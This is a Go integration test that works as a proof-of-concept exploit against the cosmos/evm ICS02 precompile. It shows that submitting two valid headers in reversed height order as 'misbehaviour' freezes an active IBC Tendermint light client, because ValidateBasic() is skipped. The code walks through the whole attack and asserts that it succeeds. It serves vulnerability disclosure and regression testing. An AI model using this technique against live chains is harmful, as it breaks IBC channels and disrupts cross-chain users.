package ibc

import (
	"math/big"
	"testing"
	"time"

	"github.com/stretchr/testify/suite"

	"github.com/cosmos/evm/evmd"
	"github.com/cosmos/evm/evmd/tests/integration"
	"github.com/cosmos/evm/precompiles/ics02"
	evmibctesting "github.com/cosmos/evm/testutil/ibc"
	clienttypes "github.com/cosmos/ibc-go/v10/modules/core/02-client/types"
	ibcexported "github.com/cosmos/ibc-go/v10/modules/core/exported"
	ibctm "github.com/cosmos/ibc-go/v10/modules/light-clients/07-tendermint"
	ibctesting "github.com/cosmos/ibc-go/v10/testing"
)

// TestFalseMisbehaviourClientFreeze demonstrates that an attacker can freeze
// any active IBC Tendermint light client via the ICS02 precompile by submitting
// two legitimate (non-misbehaving) headers in reversed height order.
//
// Root cause: The precompile at precompiles/ics02/tx.go:54-57 skips
// ValidateBasic() after unmarshalling the client message. ValidateBasic()
// enforces Header1.Height >= Header2.Height (misbehaviour.go:88).
// CheckForMisbehaviour (misbehaviour_handle.go:74) assumes this ordering
// holds when checking for BFT time violations, producing a false positive
// when the ordering is reversed.
//
// Impact: Any EVM user can freeze any active Tendermint IBC client using only
// publicly available block headers from the counterparty chain. This breaks
// all IBC channels using the frozen client.

type FalseMisbehaviourTestSuite struct {
	suite.Suite

	coordinator *evmibctesting.Coordinator

	chainA           *evmibctesting.TestChain
	chainAPrecompile *ics02.Precompile
	chainB           *evmibctesting.TestChain

	pathBToA *evmibctesting.Path
}

func (s *FalseMisbehaviourTestSuite) SetupTest() {
	s.coordinator = evmibctesting.NewCoordinator(s.T(), 2, 0, integration.SetupEvmd)
	s.chainA = s.coordinator.GetChain(evmibctesting.GetEvmChainID(1))
	s.chainB = s.coordinator.GetChain(evmibctesting.GetEvmChainID(2))

	s.pathBToA = evmibctesting.NewTransferPath(s.chainB, s.chainA)
	s.pathBToA.Setup()

	evmAppA := s.chainA.App.(*evmd.EVMD)
	s.chainAPrecompile = ics02.NewPrecompile(
		evmAppA.AppCodec(),
		evmAppA.IBCKeeper.ClientKeeper,
	)
}

func (s *FalseMisbehaviourTestSuite) TestFalseMisbehaviourClientFreeze() {
	clientID := ibctesting.FirstClientID
	evmAppA := s.chainA.App.(*evmd.EVMD)

	// ---------------------------------------------------------------
	// Step 1: Verify the client is Active before the attack
	// ---------------------------------------------------------------
	status := evmAppA.IBCKeeper.ClientKeeper.GetClientStatus(
		s.chainA.GetContext(), clientID,
	)
	s.Require().Equal(ibcexported.Active, status,
		"precondition: client must be Active before attack")

	// ---------------------------------------------------------------
	// Step 2: Record the current trusted height (the client's latest
	// consensus state) and the trusted validators at that height.
	// ---------------------------------------------------------------
	trustedHeight := evmAppA.IBCKeeper.ClientKeeper.GetClientLatestHeight(
		s.chainA.GetContext(), clientID,
	)
	trustedVals, ok := s.chainB.TrustedValidators[trustedHeight.RevisionHeight]
	s.Require().True(ok, "must have trusted validators at the client's latest height")

	// ---------------------------------------------------------------
	// Step 3: Create Header 1 at height H (= trustedHeight + 1).
	// This is a perfectly legitimate header from chainB, signed by
	// chainB's current validator set.
	// ---------------------------------------------------------------
	heightH := int64(trustedHeight.RevisionHeight) + 1
	timeH := s.chainB.ProposedHeader.Time.Add(1 * time.Minute)

	header1 := s.chainB.CreateTMClientHeader(
		s.chainB.ChainID,
		heightH,
		clienttypes.Height(trustedHeight),
		timeH,
		s.chainB.Vals,
		s.chainB.NextVals,
		trustedVals,
		s.chainB.Signers,
	)

	// ---------------------------------------------------------------
	// Step 4: Create Header 2 at height H+1 (higher than Header 1)
	// with a later timestamp (normal BFT monotonic time).
	// Both headers reference the same trustedHeight.
	// ---------------------------------------------------------------
	heightH1 := heightH + 1
	timeH1 := timeH.Add(1 * time.Minute) // later time for higher height (normal)

	header2 := s.chainB.CreateTMClientHeader(
		s.chainB.ChainID,
		heightH1,
		clienttypes.Height(trustedHeight),
		timeH1,
		s.chainB.Vals,
		s.chainB.NextVals,
		trustedVals,
		s.chainB.Signers,
	)

	// ---------------------------------------------------------------
	// Step 5: Build the Misbehaviour with REVERSED ordering.
	//
	// Header1 = header at height H   (LOWER)
	// Header2 = header at height H+1 (HIGHER)
	//
	// ValidateBasic() requires Header1.Height >= Header2.Height.
	// Here Header1.Height < Header2.Height -- invalid ordering.
	// ---------------------------------------------------------------
	misbehaviour := &ibctm.Misbehaviour{
		ClientId: clientID,
		Header1:  header1, // height H   (lower)
		Header2:  header2, // height H+1 (higher)
	}

	// ---------------------------------------------------------------
	// Step 6: Sanity check -- ValidateBasic() SHOULD reject this.
	// This proves it is NOT real misbehaviour.
	// ---------------------------------------------------------------
	err := misbehaviour.ValidateBasic()
	s.Require().Error(err, "ValidateBasic must reject reversed-height misbehaviour")
	s.T().Logf("ValidateBasic correctly rejects: %v", err)

	// ---------------------------------------------------------------
	// Step 7: Serialize the misbehaviour as protobuf Any and marshal
	// to bytes, exactly as the precompile will receive it.
	// ---------------------------------------------------------------
	anyMisbehaviour, err := clienttypes.PackClientMessage(misbehaviour)
	s.Require().NoError(err)

	updateBz, err := anyMisbehaviour.Marshal()
	s.Require().NoError(err)

	// ABI-encode the precompile call
	calldata, err := s.chainAPrecompile.Pack(
		ics02.UpdateClientMethod, clientID, updateBz,
	)
	s.Require().NoError(err)

	// ---------------------------------------------------------------
	// Step 8: Submit via an EVM transaction to the ICS02 precompile.
	// The precompile deserializes the bytes and calls
	// keeper.UpdateClient WITHOUT calling ValidateBasic().
	// ---------------------------------------------------------------
	senderIdx := 1
	senderAccount := s.chainA.SenderAccounts[senderIdx]

	_, _, resp, err := s.chainA.SendEvmTx(
		senderAccount, senderIdx,
		s.chainAPrecompile.Address(),
		big.NewInt(0),
		calldata,
		200_000,
	)

	// ---------------------------------------------------------------
	// Step 9: Assert the attack succeeded.
	// ---------------------------------------------------------------
	s.Require().NoError(err, "EVM tx must succeed (no revert)")

	// The precompile should return UpdateResultMisbehaviour (1),
	// indicating it falsely detected misbehaviour.
	out, err := s.chainAPrecompile.Unpack(ics02.UpdateClientMethod, resp.Ret)
	s.Require().NoError(err)
	result, ok := out[0].(uint8)
	s.Require().True(ok)
	s.Require().Equal(ics02.UpdateResultMisbehaviour, result,
		"precompile must return Misbehaviour result (false positive)")

	// ---------------------------------------------------------------
	// Step 10: Assert the client is now Frozen.
	// ---------------------------------------------------------------
	status = evmAppA.IBCKeeper.ClientKeeper.GetClientStatus(
		s.chainA.GetContext(), clientID,
	)
	s.Require().Equal(ibcexported.Frozen, status,
		"client must be Frozen after the attack")

	s.T().Log("SUCCESS: IBC client was frozen using two legitimate (non-misbehaving) headers")
	s.T().Log("Root cause: missing ValidateBasic() in precompiles/ics02/tx.go")
}

func TestFalseMisbehaviourClientFreeze(t *testing.T) {
	suite.Run(t, new(FalseMisbehaviourTestSuite))
}
